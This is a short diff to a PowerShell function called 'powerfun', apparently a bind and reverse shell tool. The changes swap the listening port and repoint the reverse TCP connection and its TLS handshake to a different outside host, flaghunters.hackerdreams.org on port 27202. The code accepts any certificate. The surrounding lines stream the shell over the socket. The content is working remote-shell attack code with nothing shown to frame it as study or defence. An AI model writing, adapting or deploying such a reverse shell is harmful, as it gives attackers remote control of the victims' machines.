@@ -16,13 +16,13 @@ function powerfun
     $modules = @()
     if ($Command -eq "bind")
     {
-        $listener = [System.Net.Sockets.TcpListener]39373
+        $listener = [System.Net.Sockets.TcpListener]27202
         $listener.start()
         $client = $listener.AcceptTcpClient()
     }
     if ($Command -eq "reverse")
     {
-        $client = New-Object System.Net.Sockets.TCPClient("flaghunters.github.io",39373)
+        $client = New-Object System.Net.Sockets.TCPClient("flaghunters.hackerdreams.org",27202)
     }
 
     $stream = $client.GetStream()
@@ -30,7 +30,7 @@ function powerfun
     if ($Sslcon -eq "true")
     {
         $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
-        $sslStream.AuthenticateAsClient("http://flaghunters.github.io/",$null,"tls12",$false)
+        $sslStream.AuthenticateAsClient("https://flaghunters.hackerdreams.org/",$null,"tls12",$false)
         $stream = $sslStream
     }
 
